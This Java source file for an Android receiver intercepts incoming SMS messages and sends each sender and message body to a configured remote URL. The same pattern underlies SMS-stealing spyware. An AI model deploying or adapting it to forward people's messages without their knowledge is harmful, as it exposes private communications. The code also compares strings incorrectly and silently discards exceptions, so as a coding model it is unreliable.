package com.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {
			Bundle bundle = intent.getExtras(); // ---get the SMS message passed
												// in---
			SmsMessage[] msgs = null;
			String msg_from;
			if (bundle != null) {
				// ---retrieve the SMS message received---
				try {
					Object[] pdus = (Object[]) bundle.get("pdus");
					msgs = new SmsMessage[pdus.length];
					for (int i = 0; i < msgs.length; i++) {
						msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						msg_from = msgs[i].getOriginatingAddress();
						String msg_body = msgs[i].getMessageBody();
						
						if (msg_body != "" && msg_from != ""){
							Uri.Builder b = Uri.parse(Defaults.RECEIVED_URL).buildUpon();
							b.appendQueryParameter("From", msg_from);
							b.appendQueryParameter("Message", msg_body);
							String received_url = b.build().toString();
			        	
							new TouchTask().execute(received_url);
						}
					}
				} catch (Exception e) {
					// Log.d("Exception caught",e.getMessage());
				}
			}
		}
	}
}